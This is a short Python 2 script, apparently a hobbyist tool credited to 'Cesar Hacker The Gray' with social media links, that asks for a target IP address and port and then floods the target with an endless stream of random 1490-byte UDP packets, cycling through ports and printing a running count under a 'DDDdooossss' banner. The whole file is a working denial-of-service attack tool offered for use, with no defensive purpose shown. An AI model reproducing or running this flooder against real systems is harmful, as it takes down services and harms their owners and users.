import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

    

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print "\033[1;31m"
os.system("figlet Carga util")
print"         \033[1;33mCesar Hacker The Gray"

print
print "\033[1;32mYou Tube :\033[1;36m https://youtu.be/j5xcLlOZ2pQ"
print "\033[1;32mTelegram :\033[1;36m http://t.me/CesarGray"
print "\033[1;32mFacebook :\033[1;36m Cesar Hack Gray"
print
print "\033[1;36m"
ip = raw_input("IP Pajina :\033[1;31m ")
port = input("\033[1;36mPuerto    : \033[1;31m")

os.system("clear")
print "\033[1;31m"
os.system("figlet DDDdooossss")
print "       \033[1;33mCesar Hacker The Gray"
print "\033[1;32m"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 95534:
       port = 1

